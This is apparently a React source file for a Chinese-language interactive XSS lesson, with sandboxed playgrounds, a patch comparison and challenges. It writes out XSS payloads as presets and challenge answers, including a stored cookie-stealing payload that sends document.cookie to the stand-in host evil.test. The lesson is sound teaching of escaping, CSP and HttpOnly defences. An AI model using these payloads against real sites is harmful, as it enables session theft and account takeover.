import { useEffect, useId, useMemo, useRef, useState, type ReactNode } from 'react'
import {
  ChallengeCard, OwaspLine, FakeSite, Insights, Presets, ResultBox, Section, SegmentLegend, SegmentView, Term, TextField,
} from '../../components/ui.tsx'
import {
  domTree, features, isAttempt, pageParts, toSegments, victimDoc, willExecute,
  type DomNode, type XssKind,
} from './engine.ts'
import s from './xss.module.css'

const COOKIES: Record<string, string> = {
  訪客: 'session=demo-visitor-7f3a',
  admin: 'session=FLAG{st0r3d_xss_c00k13_th13f}',
}

const KIND_LABEL: Record<XssKind, string> = { reflected: '反射型 Reflected', stored: '儲存型 Stored', dom: 'DOM 型 DOM-based' }

interface Preset { label: string; value: string }
const PRESETS: Record<XssKind, Preset[]> = {
  reflected: [
    { label: '正常搜尋', value: '貓咪圖片' },
    { label: '<script>alert', value: "<script>alert('XSS')</script>" },
    { label: '<img onerror>', value: "<img src=x onerror=alert('XSS')>" },
  ],
  stored: [
    { label: '正常留言', value: '推一個！' },
    { label: '偷 cookie', value: `<img src=x onerror="new Image().src='https://evil.test/?c='+document.cookie">` },
    { label: '<script>alert', value: "<script>alert('大家都會中')</script>" },
  ],
  dom: [
    { label: '正常', value: '小美' },
    { label: '<script>（不會執行）', value: "<script>alert('XSS')</script>" },
    { label: '<img onerror>', value: "<img src=x onerror=alert('DOM XSS')>" },
  ],
}

// 受害者 iframe：把 alert / error 透過 postMessage 傳回來；securitypolicyviolation 代表攻擊者想對外偷資料被 CSP 擋下
interface Hit { alert?: string; error?: string; exfil?: string }

function Victim({ kind, inputs, escape, strictCsp, viewer, onHit }: {
  kind: XssKind; inputs: string[]; escape: boolean; strictCsp: boolean; viewer: string; onHit: (h: Hit) => void
}) {
  const ref = useRef<HTMLIFrameElement>(null)
  const doc = useMemo(
    () => victimDoc(kind, inputs, { escape, strictCsp, viewer, cookie: COOKIES[viewer] ?? COOKIES.訪客 }),
    [kind, inputs, escape, strictCsp, viewer],
  )

  useEffect(() => {
    function onMsg(e: MessageEvent) {
      if (e.source !== ref.current?.contentWindow) return // 只收自己那個 iframe 的訊息
      const d = e.data as { type?: string; msg?: string }
      if (d?.type === 'alert') onHit({ alert: String(d.msg) })
      else if (d?.type === 'error') onHit({ error: String(d.msg) })
    }
    window.addEventListener('message', onMsg)
    return () => { window.removeEventListener('message', onMsg) }
  }, [onHit])

  return (
    <iframe
      ref={ref} className={s.frame} height={kind === 'stored' ? 190 : 120} title="受害者頁面（隔離沙箱）"
      sandbox="allow-scripts"
      srcDoc={doc}
    />
  )
}

// 偵測攻擊者用 new Image().src / fetch 往 evil.test 偷資料。iframe 的 CSP 會真的擋下請求，
// 這裡用靜態分析重現「攻擊者伺服器會收到什麼」給使用者看。
function exfilPreview(input: string, cookie: string): string | undefined {
  if (!/evil\.test/i.test(input) || !/document\.cookie/i.test(input)) return undefined
  return cookie
}

function AttackOutput({ hit, exfil }: { hit: Hit; exfil?: string }) {
  return (
    <>
      {hit.alert !== undefined && (
        <div className={s.alert} role="alert">
          <span>⚠️ forum.demo 顯示</span>
          <strong>{hit.alert || '(空字串)'}</strong>
          <span style={{ marginTop: '.3rem' }}>這個彈窗是被注入的 JavaScript 跳出來的，不是論壇本來的功能。</span>
        </div>
      )}
      {exfil && (
        <ResultBox tone="leak">
          😈 攻擊者伺服器 <code>evil.test</code> 收到了：<strong>{exfil}</strong>
          <div className={s.err}>（真實的對外請求已被本站 iframe 的 CSP 擋下，這裡只是重現攻擊者會拿到的東西。）</div>
        </ResultBox>
      )}
      {hit.error && <p className={s.err}>iframe 內的錯誤：{hit.error}</p>}
    </>
  )
}

// ---------- 伺服器內部：HTML 上色 + DOM 樹 ----------

function TreeNode({ n }: { n: DomNode }) {
  if (n.text !== undefined) return <li className={`${s.text} ${n.injected ? s.injected : ''}`}>“{n.text}”</li>
  return (
    <li>
      <span className={`${s.node} ${n.injected ? s.injected : ''}`}>
        &lt;{n.tag}
        {n.attrs.map((a) => <span key={a} className={/^on/i.test(a) ? s.handler : undefined}> {a}</span>)}&gt;
      </span>
      {n.inert && <span className={s.inert}>⛔ 這個 &lt;script&gt; 是用 innerHTML 塞進來的，不會執行</span>}
      {n.children.length > 0 && <ul>{n.children.map((c, i) => <TreeNode key={i} n={c} />)}</ul>}
    </li>
  )
}

function insights(kind: XssKind, input: string, willRun: boolean): { tone: 'attack' | 'safe' | 'leak'; text: ReactNode }[] {
  const out: { tone: 'attack' | 'safe' | 'leak'; text: ReactNode }[] = []
  const f = features(input)
  if (!isAttempt(input)) {
    if (input) out.push({ tone: 'safe', text: '你的輸入只是文字，被當成內容顯示。這是正常情況。' })
    return out
  }
  if (f.scriptTag && kind === 'dom') out.push({ tone: 'safe', text: <>用 <code>innerHTML</code> 塞進去的 <code>&lt;script&gt;</code> 依 HTML 規範不會執行，所以這招對 DOM 型無效，要改用事件處理器。</> })
  else if (f.scriptTag) out.push({ tone: 'attack', text: <>你的 <code>&lt;script&gt;</code> 被當成標籤插進頁面，裡面的 JavaScript 會直接執行。</> })
  if (f.handlers.length > 0) out.push({ tone: 'attack', text: <><code>{f.handlers.join(' ')}</code> 是事件處理器。<code>onerror</code> 會在圖片載入失敗時觸發，不用使用者點就自動跑。</> })
  if (f.jsUrl) out.push({ tone: 'attack', text: <><code>javascript:</code> 開頭的網址，被點擊時會把後面當程式執行。</> })
  if (/document\.cookie/i.test(input)) out.push({ tone: 'leak', text: <><code>document.cookie</code> 讀得到你的登入憑證，再用 <code>new Image().src</code> 送到攻擊者的網址，就完成偷 cookie。</> })
  if (willRun) out.push({ tone: 'attack', text: '結果：注入的程式碼成功在受害者的瀏覽器裡執行了。' })
  return out
}

// ---------- 第 2 段：攻擊遊樂場 ----------

const VIEWERS = ['訪客', 'admin']

function Playground() {
  const [kind, setKind] = useState<XssKind>('reflected')
  const [input, setInput] = useState('貓咪圖片')
  const [stored, setStored] = useState<string[]>([])
  const [viewer, setViewer] = useState('訪客')
  const [hit, setHit] = useState<Hit>({})
  const id = useId()

  // 換分頁時重設
  function pick(k: XssKind) { setKind(k); setInput(PRESETS[k][0].value); setStored([]); setViewer('訪客'); setHit({}) }

  const inputs = kind === 'stored' ? stored : [input]
  const willRun = kind === 'stored' ? stored.some((c) => willExecute('stored', c, { escape: false, strictCsp: false })) : willExecute(kind, input, { escape: false, strictCsp: false })
  const cookie = COOKIES[viewer] ?? COOKIES.訪客
  const exfil = kind === 'stored'
    ? stored.map((c) => exfilPreview(c, cookie)).find(Boolean)
    : exfilPreview(input, cookie)
  const segs = toSegments(pageParts(kind, inputs, false))
  const tree = domTree(pageParts(kind, inputs, false), kind)
  const urlQ = kind === 'reflected' ? `https://forum.demo/search?q=${encodeURIComponent(input)}` : kind === 'stored' ? 'https://forum.demo/thread/42' : `https://forum.demo/welcome#name=${encodeURIComponent(input)}`

  return (
    <>
      <div className={s.tabs} role="tablist" aria-label="XSS 類型">
        {(Object.keys(KIND_LABEL) as XssKind[]).map((k) => (
          <button key={k} type="button" role="tab" aria-pressed={k === kind} onClick={() => pick(k)}>{KIND_LABEL[k]}</button>
        ))}
      </div>

      <div className="grid-2">
        <FakeSite url={urlQ}>
          {kind === 'reflected' && <>
            <h3>🔍 Demo 論壇｜搜尋</h3>
            <div className={s.row}>
              <TextField id={`${id}-q`} label="搜尋文章" value={input} onChange={(v) => { setInput(v); setHit({}) }} />
            </div>
          </>}
          {kind === 'stored' && <>
            <h3>💬 Demo 論壇｜留言板</h3>
            <p className="hint">你送出的留言會被存起來，每個打開這頁的人都會載入到它。</p>
            <form className={s.row} onSubmit={(e) => { e.preventDefault(); setStored((xs) => [...xs, input]); setInput('') }}>
              <TextField id={`${id}-c`} label="寫留言" value={input} onChange={setInput} />
              <button type="submit" className="primary">送出</button>
            </form>
          </>}
          {kind === 'dom' && <>
            <h3>👋 Demo 論壇｜歡迎頁</h3>
            <p className="hint">前端 JS 直接把網址 <code>#name=</code> 後面的字用 <code>innerHTML</code> 寫進頁面，伺服器完全沒參與。</p>
            <div className={s.row}>
              <TextField id={`${id}-h`} label="網址裡的 name" value={input} onChange={(v) => { setInput(v); setHit({}) }} />
            </div>
          </>}

          {kind === 'stored' && (
            <div className={s.viewers} role="group" aria-label="用誰的身分看這頁">
              <span>用誰的身分打開這頁：</span>
              {VIEWERS.map((v) => (
                <button key={v} type="button" aria-pressed={v === viewer} onClick={() => { setViewer(v); setHit({}) }}>{v === 'admin' ? '👑 admin' : '🙂 訪客'}</button>
              ))}
            </div>
          )}

          <Victim kind={kind} inputs={inputs} escape={false} strictCsp={false} viewer={viewer} onHit={(h) => setHit((old) => ({ ...old, ...h }))} />
          <AttackOutput hit={hit} exfil={exfil} />
          <Presets items={PRESETS[kind]} onPick={(x) => { if (kind === 'stored') setInput(x.value); else { setInput(x.value); setHit({}) } }} />
        </FakeSite>

        <div className="card panel">
          <div>
            <h3>🖥️ 瀏覽器實際拿到並解析的 HTML</h3>
            <SegmentView segments={segs} label="受害者頁面的 HTML" />
            <SegmentLegend code="網站原本的 HTML" injected="你的輸入，變成了標籤 / 程式" />
          </div>
          <Insights items={insights(kind, kind === 'stored' ? (stored[stored.length - 1] ?? '') : input, willRun)} />
          <div>
            <h3>🌳 瀏覽器建出來的 DOM 樹</h3>
            <ul className={s.tree}>{tree.children.map((c, i) => <TreeNode key={i} n={c} />)}</ul>
            <p className="caption">紅色節點 = 從你的輸入長出來的。</p>
          </div>
        </div>
      </div>
    </>
  )
}

// ---------- 第 3 段：修補對照 ----------

function Patch() {
  const [input, setInput] = useState("<img src=x onerror=alert('XSS')>")
  const [strictCsp, setStrictCsp] = useState(false)
  const id = useId()
  const [vulnHit, setVulnHit] = useState<Hit>({})
  const [safeHit, setSafeHit] = useState<Hit>({})
  const segVuln = toSegments(pageParts('reflected', [input], false))
  const segSafe = toSegments(pageParts('reflected', [input], true))

  return (
    <>
      <div className={s.row} style={{ maxWidth: '36rem' }}>
        <TextField id={`${id}-in`} label="攻擊字串（兩邊同時套用）" value={input} onChange={(v) => { setInput(v); setVulnHit({}); setSafeHit({}) }} />
      </div>
      <label className={s.check}>
        <input type="checkbox" checked={strictCsp} onChange={(e) => { setStrictCsp(e.target.checked); setVulnHit({}) }} />
        幫漏洞版加上嚴格 CSP（<code>script-src 'nonce-…'</code>）：就算忘了 escape，注入的 inline script 也跑不動
      </label>

      <div className="grid-2">
        <div className="card">
          <h3 className="head-vuln">❌ 漏洞版：直接把輸入拼進 HTML</h3>
          <pre className="code-block">
            <span className="tok-cm">{'// 伺服器端樣板\n'}</span>
            {'res.send('}<span className="tok-str">`&lt;p&gt;你搜尋的是：&lt;b&gt;`</span>{' + '}<span className="tok-var">q</span>{' + '}<span className="tok-str">`&lt;/b&gt;&lt;/p&gt;`</span>{')'}
          </pre>
          <SegmentView segments={segVuln} label="漏洞版輸出的 HTML" />
          <Victim kind="reflected" inputs={[input]} escape={false} strictCsp={strictCsp} viewer="訪客" onHit={(h) => setVulnHit((o) => ({ ...o, ...h }))} />
          <AttackOutput hit={vulnHit} />
          {strictCsp && Object.keys(vulnHit).length === 0 && isAttempt(input) && (
            <ResultBox tone="ok">🛡️ CSP 擋下了：inline script 沒有正確的 nonce，瀏覽器拒絕執行。</ResultBox>
          )}
        </div>

        <div className="card">
          <h3 className="head-safe">✅ 修補版：輸出前先 escape</h3>
          <pre className="code-block">
            <span className="tok-cm">{'// 把 < > & " \' 轉成 HTML 實體\n'}</span>
            {'res.send('}<span className="tok-str">`...&lt;b&gt;`</span>{' + '}<span className="tok-safe">escapeHtml(</span><span className="tok-var">q</span><span className="tok-safe">)</span>{' + '}<span className="tok-str">`&lt;/b&gt;...`</span>{')'}
          </pre>
          <SegmentView segments={segSafe} label="修補版輸出的 HTML" />
          <Victim kind="reflected" inputs={[input]} escape strictCsp={false} viewer="訪客" onHit={(h) => setSafeHit((o) => ({ ...o, ...h }))} />
          <AttackOutput hit={safeHit} />
          {isAttempt(input) && Object.keys(safeHit).length === 0 && (
            <ResultBox tone="ok">🛡️ 你的輸入變成純文字顯示，<code>&lt;img&gt;</code> 只是字，不會變成標籤。</ResultBox>
          )}
        </div>
      </div>

      <div className="card" style={{ marginTop: '1.25rem' }}>
        <p style={{ marginTop: 0 }}>
          <strong>核心修補：輸出編碼（escape）。</strong>
          在把使用者資料放進 HTML 之前，先把 <code>&lt; &gt; &amp; &quot; &#39;</code> 轉成 HTML 實體，瀏覽器就只會把它當文字顯示，不會解析成標籤。DOM 型則改用
          <Term tip="element.textContent = x 會把 x 當純文字寫入，不解析 HTML；element.innerHTML = x 會解析成標籤。">textContent</Term>
          取代 <code>innerHTML</code>。
        </p>
        <strong>其他防線（多一層保險）：</strong>
        <ul className="defenses">
          <li><Term tip="Content Security Policy：由伺服器用 HTTP 標頭或 <meta> 設定，限制頁面能載入與執行哪些資源。">CSP</Term>：限制只能執行帶正確 nonce 的腳本，擋掉注入的 inline script（上面的開關可以試）</li>
          <li>Cookie 設 <code>HttpOnly</code>：JavaScript 讀不到，就算有 XSS 也偷不走 session</li>
          <li>用框架內建的自動跳脫（React 的 JSX、Vue 的 mustache 預設都會 escape）</li>
        </ul>
      </div>
    </>
  )
}

// ---------- 第 4 段：挑戰 ----------

function ReflectedChallenge() {
  const [input, setInput] = useState('')
  const [hit, setHit] = useState<Hit>({})
  const id = useId()
  return (
    <ChallengeCard
      title="挑戰 1：讓搜尋頁跳出 alert"
      goal={<>在反射型搜尋框輸入一段字，讓結果頁跳出 JavaScript 的 <code>alert</code>。</>}
      solved={hit.alert !== undefined}
      hints={[
        <>搜尋的字會原封不動出現在 HTML 裡。如果那段字本身就是一個 <code>&lt;script&gt;</code> 標籤呢？</>,
        <>標籤要完整，記得有開有關。</>,
        <>解答：<code>{"<script>alert(1)</script>"}</code></>,
      ]}
      why={<>伺服器把你的輸入直接拼進 HTML，瀏覽器就把 <code>&lt;script&gt;</code> 當成真的腳本標籤執行。真實攻擊會把這種網址傳給受害者點。</>}
    >
      <div className={s.row}>
        <TextField id={id} label="搜尋文章" value={input} onChange={(v) => { setInput(v); setHit({}) }} />
      </div>
      <Victim kind="reflected" inputs={[input]} escape={false} strictCsp={false} viewer="訪客" onHit={(h) => setHit((o) => ({ ...o, ...h }))} />
      <AttackOutput hit={hit} />
    </ChallengeCard>
  )
}

function StoredChallenge() {
  const [input, setInput] = useState('')
  const [posted, setPosted] = useState<string[]>([])
  const [viewer, setViewer] = useState('訪客')
  const [hit, setHit] = useState<Hit>({})
  const id = useId()
  const cookie = COOKIES[viewer] ?? COOKIES.訪客
  const exfil = posted.map((c) => exfilPreview(c, cookie)).find(Boolean)
  const solved = viewer === 'admin' && !!exfil && exfil.includes('FLAG{')

  return (
    <ChallengeCard
      title="挑戰 2：偷走 admin 的 cookie"
      goal={<>留一則言，等 <strong>admin</strong> 來看這頁時，把 admin 的 cookie（<code>{'FLAG{...}'}</code>）送到攻擊者的 <code>evil.test</code>。</>}
      solved={solved}
      hints={[
        <>先想怎麼執行程式：<code>&lt;img src=x onerror=...&gt;</code> 的圖片一定載入失敗，<code>onerror</code> 就會跑。</>,
        <>怎麼把 cookie 送出去：<code>{"new Image().src='https://evil.test/?c='+document.cookie"}</code>。送出後記得切成 admin 身分看這頁。</>,
        <>解答：<code>{`<img src=x onerror="new Image().src='https://evil.test/?c='+document.cookie">`}</code>，送出後按「👑 admin」。</>,
      ]}
      why={<>儲存型 XSS 一次注入、人人中招。admin 打開頁面時，注入的腳本用 admin 自己的身分讀到 <code>document.cookie</code> 並送出，攻擊者就能冒用 admin 登入。真實世界要靠 <code>HttpOnly</code> cookie + 輸出編碼一起防。</>}
    >
      <form className={s.row} onSubmit={(e) => { e.preventDefault(); setPosted((xs) => [...xs, input]); setInput('') }}>
        <TextField id={id} label="寫留言" value={input} onChange={setInput} />
        <button type="submit" className="primary">送出</button>
      </form>
      <div className={s.viewers} role="group" aria-label="用誰的身分看這頁">
        <span>用誰的身分打開這頁：</span>
        {VIEWERS.map((v) => (
          <button key={v} type="button" aria-pressed={v === viewer} onClick={() => { setViewer(v); setHit({}) }}>{v === 'admin' ? '👑 admin' : '🙂 訪客'}</button>
        ))}
      </div>
      <Victim kind="stored" inputs={posted} escape={false} strictCsp={false} viewer={viewer} onHit={(h) => setHit((o) => ({ ...o, ...h }))} />
      <AttackOutput hit={hit} exfil={exfil} />
    </ChallengeCard>
  )
}

// ---------- 頁面 ----------

function FlowDiagram() {
  return (
    <svg className="diagram" viewBox="0 0 820 180" role="img" aria-label="流程：攻擊者把惡意腳本放進網站內容，受害者的瀏覽器載入後，腳本以受害者的身分執行並偷走 cookie">
      <rect className="box-attack" x="10" y="20" width="180" height="90" rx="12" />
      <text className="d-title" x="100" y="55" textAnchor="middle">😈 攻擊者</text>
      <text className="d-sub" x="100" y="80" textAnchor="middle">送出藏了腳本的內容</text>

      <line className="arrow-attack dash" x1="195" y1="65" x2="300" y2="65" />
      <text className="label-attack" x="247" y="53" textAnchor="middle">&lt;script&gt;…</text>

      <rect className="box-code" x="310" y="20" width="190" height="90" rx="12" />
      <text className="d-title" x="405" y="55" textAnchor="middle">🖥️ 網站</text>
      <text className="d-sub" x="405" y="80" textAnchor="middle">把內容原樣存起 / 回傳</text>

      <line className="arrow-code dash" x1="505" y1="65" x2="610" y2="65" />
      <text className="label-code" x="557" y="53" textAnchor="middle">含腳本的頁面</text>

      <rect className="box" x="620" y="20" width="190" height="90" rx="12" />
      <text className="d-title" x="715" y="50" textAnchor="middle">🧑 受害者瀏覽器</text>
      <text className="d-sub" x="715" y="74" textAnchor="middle">載入頁面，腳本以</text>
      <text className="d-sub" x="715" y="92" textAnchor="middle">受害者身分執行</text>

      <line className="arrow-leak dash" x1="715" y1="110" x2="715" y2="150" />
      <rect className="box-leak" x="595" y="150" width="220" height="22" rx="8" />
      <text className="d-sub" x="705" y="165" textAnchor="middle">🔓 cookie 被送去攻擊者伺服器</text>

      <text className="d-sub" x="300" y="165" textAnchor="middle">關鍵：網站沒把「使用者內容」跟「HTML 程式」分開。</text>
    </svg>
  )
}

export default function XssPage() {
  return (
    <>
      <h1>XSS（跨站腳本攻擊）</h1>
      <OwaspLine category="A05 Injection（注入）" cwe="CWE-79" />
      <Section no={1} title="情境：把 JavaScript 藏進網站內容">
        <p>
          <Term tip="Cross-Site Scripting：攻擊者把惡意 JavaScript 塞進網頁內容，讓它在其他使用者的瀏覽器裡執行。">XSS</Term>
          是當網站把使用者輸入的內容，不經處理就放進 HTML，瀏覽器便分不出哪些是「網站的程式」、哪些是「使用者打的字」，
          於是把攻擊者藏的 <code>&lt;script&gt;</code> 當成真的程式執行。它在<strong>受害者的瀏覽器</strong>裡、用<strong>受害者的身分</strong>執行，常被用來偷
          <Term tip="Cookie：瀏覽器幫你保存的小資料，常用來記住你的登入狀態（session）。被偷走等於被冒用身分。">cookie</Term>、冒用帳號。
        </p>
        <FlowDiagram />
        <p>依惡意腳本「從哪裡進到頁面」，分成三種：反射型（夾在網址裡）、儲存型（存進網站資料庫）、DOM 型（前端 JS 自己寫進頁面）。下一段可以逐一動手試。</p>
        <ResultBox tone="fail">🔒 下面每個「受害者頁面」都跑在隔離的 <code>sandbox</code> iframe 裡，而且被 CSP 禁止對外連線，沒辦法碰到你的真實 cookie 或送資料出去。</ResultBox>
      </Section>

      <Section no={2} title="動手攻擊：三種 XSS" lead="切換上方分頁試不同類型。先按「正常」看正常行為，再按攻擊範例，或自己打。右邊同步顯示瀏覽器怎麼解析你的輸入。">
        <Playground />
      </Section>

      <Section no={3} title="修補：同一個輸入，兩種寫法" lead="左邊漏洞版、右邊修補版，同時套用你輸入的攻擊字串。">
        <Patch />
      </Section>

      <Section no={4} title="挑戰：換你當攻擊者" lead="以下都是漏洞版。卡住就按提示，提示會一個一個給。">
        <ReflectedChallenge />
        <StoredChallenge />
      </Section>

      <Section no={5} title="為什麼這裡能安全地示範？">
        <div className="card">
          <p style={{ marginTop: 0 }}>這頁本身也可能被 XSS 攻擊，所以做了這些隔離：</p>
          <ul className="defenses">
            <li>所有會執行你輸入的頁面，都放在 <code>&lt;iframe sandbox="allow-scripts"&gt;</code> 裡；<strong>刻意不給</strong> <code>allow-same-origin</code>，iframe 因此拿不到本站的 cookie、localStorage。</li>
            <li>iframe 的 <code>srcdoc</code> 內建 <code>default-src 'none'</code> 的 CSP，裡面的腳本連不出去，<code>evil.test</code> 的請求會被真的擋下。</li>
            <li>主頁面（你現在看的這層）完全不用 <code>innerHTML</code> / <code>eval</code>，你的輸入只透過 <code>srcdoc</code> 字串傳進沙箱。</li>
            <li>cookie、FLAG 都是假的，攻擊者伺服器 <code>evil.test</code> 的「收到資料」是本地重現，沒有真的網路請求。</li>
          </ul>
        </div>
      </Section>
    </>
  )
}
